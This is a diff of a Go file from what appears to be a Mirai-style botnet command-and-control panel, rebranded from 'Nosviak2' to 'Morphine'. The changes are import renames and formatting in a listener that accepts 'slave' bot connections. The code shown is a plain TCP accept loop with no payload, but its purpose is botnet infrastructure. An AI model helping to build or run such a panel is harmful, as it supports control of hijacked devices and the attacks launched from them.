@@ -1,15 +1,15 @@
 package mirai
 
 import (
-	"Nosviak2/core/configs"
-	"Nosviak2/core/sources/layouts/toml"
+	deployment "Morphine/core/configs"
+	"Morphine/core/sources/layouts/toml"
 	"fmt"
 	"log"
 	"net"
 )
 
-//try to properly start the mirai handler
-//this will ensure its done without any errors
+// try to properly start the mirai handler
+// this will ensure its done without any errors
 func CreateHandler() error { //returns an error if one happened
 
 	//tries to create out tcp server properly
@@ -20,13 +20,12 @@ func CreateHandler() error { //returns an error if one happened
 	} else { //allows us to know about the listener starting properly without issues
 		fmt.Printf("[slaveMirai_listener] [the slave listener has been started properly] [%s]\r\n", toml.ConfigurationToml.Mirai.Listener)
 	}
-	
 
 	for {
 		//accepts any incoming connections
 		//this will ensure its done without any errors
 		connection, err := server.Accept() //accepts the conn
-		if err != nil { //error handles without any errors
+		if err != nil {                    //error handles without any errors
 			log.Printf("[Slave] [Error: %s]\r\n", err.Error())
 			continue //continues looping properly without issues
 		}
@@ -41,7 +40,7 @@ func CreateHandler() error { //returns an error if one happened
 			//this will ensure its done without issues
 			continue //continues looping properly
 		}
-		
+
 		//properly serves the slave properly
 		//this will ensure its done without any errors
 		go ServeConnection(connection)
